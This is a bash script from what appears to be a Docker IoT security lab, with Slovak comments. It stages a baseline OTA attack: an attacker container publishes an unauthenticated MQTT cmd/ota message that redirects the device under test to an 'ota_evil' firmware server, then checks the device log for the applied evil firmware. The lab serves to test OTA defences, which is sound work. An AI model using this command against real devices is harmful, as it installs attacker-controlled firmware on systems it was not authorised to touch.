#!/usr/bin/env bash
# OTA Baseline útok – attacker presmeruje DUT na evil OTA server
# Očakávaný výsledok: USPECH (DUT stiahne a aplikuje firmware z evil servera)
# Spustiť po: docker compose up -d  (bez ota-secure overlayu)
set -euo pipefail
cd "$(dirname "$0")/.."

echo "=== OTA BASELINE ATTACK ==="
echo ""
echo "[1] Attacker posiela cmd/ota s URL evil servera..."
docker compose exec -T attacker \
  mosquitto_pub -h mosquitto -p 1883 -t cmd/ota -m "http://ota_evil" -d
echo ""
echo "[2] Čakám 8 s na DUT reakciu..."
sleep 8
echo ""
echo "[3] Kontrolujem DUT log (hľadám 'aplikované' alebo 'evil')..."
RUN_ID=$(grep RUN_ID .env | cut -d= -f2)
grep -i "aplikované\|ota_evil\|evil\|OTA" "runs/${RUN_ID}/logs/dut.log" | tail -10 || echo "(zatial nic)"
echo ""
echo "=== VYSLEDOK: Skontroluj dut.log – DUT mal aplikovať evil verziu ==="
